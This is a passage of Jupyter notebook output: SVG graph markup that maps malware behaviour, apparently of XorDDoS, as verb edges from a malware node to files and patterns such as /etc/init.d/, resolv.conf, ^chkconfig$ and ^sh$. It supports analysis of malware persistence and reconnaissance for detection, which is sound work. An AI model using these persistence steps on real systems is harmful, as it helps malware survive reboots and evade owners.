d=\"M1353.26,-103.77C1144.8,-102.78 584.9,-97.46 557.57,-69 525.57,-35.69 698.84,-24.08 782,-20.47\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"782.31,-23.96 792.15,-20.05 782.02,-16.96 782.31,-23.96\"/>\n<text text-anchor=\"middle\" x=\"581.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">18.name</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge21\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1353.48,-103.49C1157.23,-101.8 652.41,-94.96 627.57,-69 622.96,-64.18 623.28,-59.11 627.57,-54 646.82,-31.02 729.67,-23.12 781.6,-20.41\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"782.04,-23.89 791.86,-19.92 781.71,-16.9 782.04,-23.89\"/>\n<text text-anchor=\"middle\" x=\"653.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">14.check</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge27\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1353.63,-103.13C1170.79,-100.68 723.79,-92.32 701.57,-69 674.66,-40.77 737.05,-28.01 782.46,-22.61\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"782.87,-26.09 792.42,-21.51 782.09,-19.13 782.87,-26.09\"/>\n<text text-anchor=\"middle\" x=\"732.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">12.provide</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge29\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1353.62,-102.62C1186.72,-99.24 804.82,-89.33 785.57,-69 776.46,-59.39 784.52,-47.77 795.62,-38.16\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"797.92,-40.8 803.62,-31.87 793.59,-35.3 797.92,-40.8\"/>\n<text text-anchor=\"middle\" x=\"814.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">13.contain</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge30\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1353.71,-102.58C1209.48,-99.43 908.94,-90.37 866.57,-69 855.56,-63.45 846.33,-53.6 839.35,-44.1\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"842.09,-41.91 833.58,-35.6 836.3,-45.84 842.09,-41.91\"/>\n<text text-anchor=\"middle\" x=\"888.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.have</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge36\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1353.46,-103.29C1233.57,-101.4 1008.36,-94.46 932.57,-69 921,-65.11 920.37,-59.68 909.57,-54 894.04,-45.83 876.18,-38.23 860.84,-32.21\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"861.77,-28.81 851.18,-28.49 859.26,-35.35 861.77,-28.81\"/>\n<text text-anchor=\"middle\" x=\"951.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">28.call</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge39\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1353.96,-102.41C1246.63,-99.42 1057.36,-91.11 992.57,-69 981.02,-65.06 980.77,-58.84 969.57,-54 936.07,-39.54 895.52,-30.4 865.83,-25.1\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"866.26,-21.62 855.81,-23.38 865.08,-28.52 866.26,-21.62\"/>\n<text text-anchor=\"middle\" x=\"1011.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">35.use</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge41\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1353.66,-102.58C1279.7,-99.8 1165.2,-91.81 1068.57,-69 1050.49,-64.73 1047.47,-58.92 1029.57,-54 974.04,-38.74 908.14,-28.91 866.33,-23.67\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"866.6,-20.17 856.25,-22.43 865.75,-27.12 866.6,-20.17\"/>\n<text text-anchor=\"middle\" x=\"1091.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">11.hook</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1318.57\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1318.57\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1355.32,-100.64C1268.87,-95.99 1136.9,-86.16 1121.57,-69 1117.12,-64.03 1117.28,-59.11 1121.57,-54 1141.5,-30.21 1229.59,-22.58 1280.97,-20.14\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1281.2,-23.63 1291.04,-19.71 1280.89,-16.64 1281.2,-23.63\"/>\n<text text-anchor=\"middle\" x=\"1144.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">39.fetch</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge13\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1353.36,-103.31C1291.39,-100.93 1211.39,-93.09 1190.57,-69 1163.07,-37.21 1234.04,-25.49 1280.97,-21.28\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1281.47,-24.75 1291.16,-20.45 1280.9,-17.77 1281.47,-24.75\"/>\n<text text-anchor=\"middle\" x=\"1227.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">7.resolv.conf</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge15\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1363.91,-95.69C1331.48,-90.14 1297.39,-81.52 1287.57,-69 1280.37,-59.84 1285.74,-48.91 1293.91,-39.62\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1296.65,-41.82 1301.21,-32.26 1291.68,-36.89 1296.65,-41.82\"/>\n<text text-anchor=\"middle\" x=\"1308.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">42.read</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge16\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1388.03,-89.94C1375.76,-84.61 1362.92,-77.68 1352.57,-69 1344.45,-62.19 1337.44,-52.98 1331.94,-44.32\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1334.88,-42.42 1326.76,-35.61 1328.87,-46 1334.88,-42.42\"/>\n<text text-anchor=\"middle\" x=\"1380.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.m6_6n3</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge24\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1426.59,-86.74C1423.34,-76.08 1417.75,-62.79 1408.57,-54 1393.75,-39.82 1372.54,-31.2 1354.43,-26.06\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1355.31,-22.67 1344.75,-23.55 1353.55,-29.45 1355.31,-22.67\"/>\n<text text-anchor=\"middle\" x=\"1445.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">29.create</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge40\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1458.88,-88.11C1472.47,-78.45 1483.96,-65.74 1474.57,-54 1459.93,-35.72 1396.84,-26.33 1355.51,-22.06\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1355.81,-18.57 1345.51,-21.08 1355.13,-25.54 1355.81,-18.57\"/>\n<text text-anchor=\"middle\" x=\"1501.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.drop</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1557.57\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1557.57\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^sh$</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1484.08,-91.93C1499.26,-86.68 1515.05,-79.29 1527.57,-69 1535.37,-62.58 1541.66,-53.56 1546.41,-44.94\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1549.6,-46.4 1550.98,-35.89 1543.35,-43.25 1549.6,-46.4\"/>\n<text text-anchor=\"middle\" x=\"1560.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">34.find</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1649.57\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1649.57\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1486.41,-92.53C1526.69,-84.04 1575.51,-73.26 1584.57,-69 1599.18,-62.13 1613.61,-51.52 1625.15,-41.85\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1627.74,-44.23 1633,-35.03 1623.15,-38.95 1627.74,-44.23\"/>\n<text text-anchor=\"middle\" x=\"1631.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">20.drop</text>\n</g>\n<!-- 8 -->\n<g id=\"node9\" class=\"node\">\n<title>8</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1869.57\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1869.57\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1486.44,-92.38C1496.45,-90.46 1506.8,-88.59 1516.57,-87 1578.92,-76.87 1595.89,-82.66 1657.57,-69 1678.97,-64.26 1683.37,-59.62 1704.57,-54 1743.94,-43.57 1789.25,-34.14 1822.41,-27.7\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1823.13,-31.13 1832.29,-25.8 1821.81,-24.25 1823.13,-31.13\"/>\n<text text-anchor=\"middle\" x=\"1727.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">41.fetch</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge18\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1485.46,-92.14C1495.76,-90.21 1506.46,-88.38 1516.57,-87 1619.91,-72.86 1651.8,-102.54 1750.57,-69 1762.12,-65.08 1762.65,-59.46 1773.57,-54 1790.54,-45.51 1810.1,-38 1827.11,-32.14\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1828.43,-35.39 1836.8,-28.88 1826.2,-28.75 1828.43,-35.39\"/>\n<text text-anchor=\"middle\" x=\"1810.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">9.resolv.conf</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge23\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1484.97,-92.04C1495.42,-90.09 1506.3,-88.29 1516.57,-87 1553.11,-82.42 1817.28,-89.96 1847.57,-69 1855.39,-63.59 1860.45,-54.75 1863.73,-45.99\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1867.1,-46.92 1866.71,-36.33 1860.42,-44.85 1867.1,-46.92\"/>\n<text text-anchor=\"middle\" x=\"1888.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.m6_6n3</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge26\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1484.5,-92.05C1495.09,-90.07 1506.14,-88.26 1516.57,-87 1538.87,-84.31 1905.04,-85.24 1920.57,-69 1931.03,-58.06 1919.92,-46.19 1905.44,-36.76\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1907.03,-33.64 1896.65,-31.51 1903.44,-39.65 1907.03,-33.64\"/>\n<text text-anchor=\"middle\" x=\"1946.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">44.read</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge31\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1484.5,-92.01C1495.08,-90.03 1506.14,-88.23 1516.57,-87 1541.69,-84.04 1954.03,-87.24 1971.57,-69 1992.12,-47.62 1953.34,-34.11 1917.83,-26.59\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1918.45,-23.15 1907.96,-24.63 1917.09,-30.01 1918.45,-23.15\"/>\n<text text-anchor=\"middle\" x=\"2003.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">31.create</text>\n</g>\n<!-- 9 -->\n<g id=\"node10\" class=\"node\">\n<title>9</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2121.57\" cy=\"-18\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2121.57\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1484.49,-91.97C1495.08,-90 1506.13,-88.21 1516.57,-87 1630.54,-73.83 1922.09,-99.98 2032.57,-69 2053.3,-63.19 2074.4,-51.63 2090.85,-41.09\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2093.07,-43.82 2099.48,-35.38 2089.21,-37.98 2093.07,-43.82\"/>\n<text text-anchor=\"middle\" x=\"2092.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">38.fetch</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge14\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1484.49,-91.93C1495.07,-89.96 1506.13,-88.18 1516.57,-87 1549.87,-83.24 2095.75,-92.58 2119.57,-69 2125.47,-63.16 2127.24,-54.7 2127.15,-46.4\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2130.61,-45.81 2126.19,-36.18 2123.64,-46.46 2130.61,-45.81\"/>\n<text text-anchor=\"middle\" x=\"2163.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">51.download</text>\n</g>\n<!-- 12 -->\n<g id=\"node13\" class=\"node\">\n<title>12</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2523.57\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2523.57\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge12\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1484.02,-91.98C1494.75,-89.98 1505.98,-88.18 1516.57,-87 1668.35,-70.13 2052.77,-93.15 2203.57,-69 2226.47,-65.33 2230.88,-58.84 2253.57,-54 2335.95,-36.42 2434.49,-26.36 2486.76,-21.86\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2487.21,-25.34 2496.88,-21.01 2486.62,-18.36 2487.21,-25.34\"/>\n<text text-anchor=\"middle\" x=\"2276.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">40.fetch</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge22\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1484.02,-91.95C1494.75,-89.96 1505.98,-88.16 1516.57,-87 1603.07,-77.53 2216.44,-94.75 2299.57,-69 2311.22,-65.39 2311.21,-58.47 2322.57,-54 2377.14,-32.51 2445.21,-24.18 2486.48,-20.97\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2486.9,-24.45 2496.62,-20.25 2486.4,-17.47 2486.9,-24.45\"/>\n<text text-anchor=\"middle\" x=\"2359.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">8.resolv.conf</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge25\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1484.02,-91.93C1494.74,-89.94 1505.97,-88.15 1516.57,-87 1613.8,-76.48 2303.11,-97.82 2396.57,-69 2408.23,-65.4 2408.58,-59.32 2419.57,-54 2441.96,-43.15 2468.58,-34.26 2489.28,-28.15\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2490.28,-31.51 2498.92,-25.38 2488.34,-24.78 2490.28,-31.51\"/>\n<text text-anchor=\"middle\" x=\"2447.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.m6_6n3</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge28\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1484.02,-91.92C1494.74,-89.92 1505.97,-88.14 1516.57,-87 1569.55,-81.31 2426.74,-90.35 2475.57,-69 2488.14,-63.5 2499.04,-52.98 2507.26,-43\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2510.19,-44.92 2513.51,-34.86 2504.64,-40.66 2510.19,-44.92\"/>\n<text text-anchor=\"middle\" x=\"2512.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.run</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge32\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1484.02,-91.91C1494.74,-89.92 1505.97,-88.13 1516.57,-87 1544.49,-84.01 2507.88,-89.04 2527.57,-69 2533.62,-62.84 2534.38,-53.95 2533.04,-45.36\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2536.44,-44.52 2530.7,-35.61 2529.63,-46.15 2536.44,-44.52\"/>\n<text text-anchor=\"middle\" x=\"2554.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">43.read</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge34\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1484.01,-91.9C1494.74,-89.91 1505.97,-88.13 1516.57,-87 1545.93,-83.87 2558.86,-90.06 2579.57,-69 2592.37,-55.98 2574.39,-42.24 2555.49,-32.46\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2556.79,-29.21 2546.26,-28 2553.74,-35.51 2556.79,-29.21\"/>\n<text text-anchor=\"middle\" x=\"2610.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">30.create</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge37\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1484.01,-91.9C1494.74,-89.9 1505.97,-88.12 1516.57,-87 1547.59,-83.71 2617.68,-91.24 2639.57,-69 2666.27,-41.87 2603.42,-28.54 2560.19,-22.77\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2560.59,-19.3 2550.23,-21.53 2559.72,-26.24 2560.59,-19.3\"/>\n<text text-anchor=\"middle\" x=\"2666.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">3.relate</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge38\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1484.01,-91.89C1494.74,-89.9 1505.97,-88.12 1516.57,-87 1549,-83.57 2667.68,-92.24 2690.57,-69 2730.53,-28.42 2621.48,-20.48 2560.91,-19.12\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2560.63,-15.62 2550.57,-18.94 2560.51,-22.62 2560.63,-15.62\"/>\n<text text-anchor=\"middle\" x=\"2725.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.contain</text>\n</g>\n<!-- 14 -->\n<g id=\"node15\" class=\"node\">\n<title>14</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2867.57\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2867.57\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">GID($|.|$)</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge17\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1484.01,-91.88C1494.74,-89.89 1505.97,-88.11 1516.57,-87 1653.49,-72.59 2621.12,-98.67 2755.57,-69 2783.1,-62.92 2812.11,-49.76 2833.71,-38.46\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2835.62,-41.41 2842.78,-33.6 2832.31,-35.24 2835.62,-41.41\"/>\n<text text-anchor=\"middle\" x=\"2830.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">45.execute</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge19\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1484.01,-91.87C1494.74,-89.88 1505.97,-88.11 1516.57,-87 1553.81,-83.1 2837.48,-94.86 2864.57,-69 2870.58,-63.26 2872.52,-54.83 2872.59,-46.52\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2876.06,-46 2871.85,-36.28 2869.08,-46.5 2876.06,-46\"/>\n<text text-anchor=\"middle\" x=\"2897.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">10.assign</text>\n</g>\n<!-- 10 -->\n<g id=\"node11\" class=\"node\">\n<title>10</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1559.57\" cy=\"-105\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1559.57\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n<!-- 11 -->\n<g id=\"node12\" class=\"node\">\n<title>11</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1663.57\" cy=\"-105\" rx=\"52.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1663.57\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">update&#45;rc.d</text>\n</g>\n<!-- 13 -->\n<g id=\"node14\" class=\"node\">\n<title>13</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1784.57\" cy=\"-105\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1784.57\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">mem_addr</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x2501fa9c6a0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Ms.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"672pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 671.80 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 667.8,-127 667.8,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"390.8\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"390.8\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"46.8\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"46.8\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M317.66,-98.99C269.7,-94.32 206.07,-85.49 151.8,-69 126.95,-61.45 100.56,-48.87 80.45,-38.21\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"81.87,-35 71.41,-33.32 78.54,-41.15 81.87,-35\"/>\n<text text-anchor=\"middle\" x=\"174.3\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">20.drop</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"138.8\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"138.8\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M328.53,-94.24C298.98,-88.59 263.5,-80.33 232.8,-69 209.61,-60.45 185,-47.19 166.78,-36.48\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"168.26,-33.28 157.88,-31.14 164.66,-39.28 168.26,-33.28\"/>\n<text text-anchor=\"middle\" x=\"258.3\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">29.create</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"239.8\" cy=\"-18\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"239.8\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M351.56,-89.35C337.72,-83.64 322.26,-76.63 308.8,-69 294.47,-60.89 279.55,-50.37 267.27,-41.09\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"269.29,-38.22 259.23,-34.89 265.02,-43.77 269.29,-38.22\"/>\n<text text-anchor=\"middle\" x=\"328.3\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">25.add</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"353.8\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"353.8\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M368.58,-87.65C363.06,-82.37 357.85,-76.04 354.8,-69 351.79,-62.07 350.71,-54.08 350.59,-46.54\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"354.1,-46.48 350.98,-36.35 347.1,-46.22 354.1,-46.48\"/>\n<text text-anchor=\"middle\" x=\"380.3\" y=\"-57.8\" font-family=\"Times New Roman,serif\" 